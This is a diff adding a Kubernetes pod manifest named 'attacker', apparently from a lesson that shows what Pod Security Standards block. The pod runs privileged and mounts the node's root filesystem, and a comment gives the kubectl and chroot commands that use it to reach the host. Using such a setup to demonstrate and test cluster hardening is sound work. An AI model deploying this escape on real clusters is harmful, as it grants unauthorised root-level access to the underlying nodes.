@@ -1,0 +1,28 @@
+# Block 5. Apply this twice: once before Pod Security Standards are enforced,
+# once after. Same file, opposite outcome.
+#
+# What it asks for, in plain terms: full privileges, and the node's entire root
+# filesystem mounted inside the container. Nothing here is exotic, and a
+# default cluster will accept all of it.
+#
+#   kubectl apply -f k8s/attacker-pod.yaml
+#   kubectl exec -it attacker -- chroot /host sh
+#   # you are now reading the node's filesystem from inside a container
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker
+spec:
+  containers:
+    - name: attacker
+      image: alpine:3.20
+      command: ["sleep", "3600"]
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - name: host
+          mountPath: /host
+  volumes:
+    - name: host
+      hostPath:
+        path: /
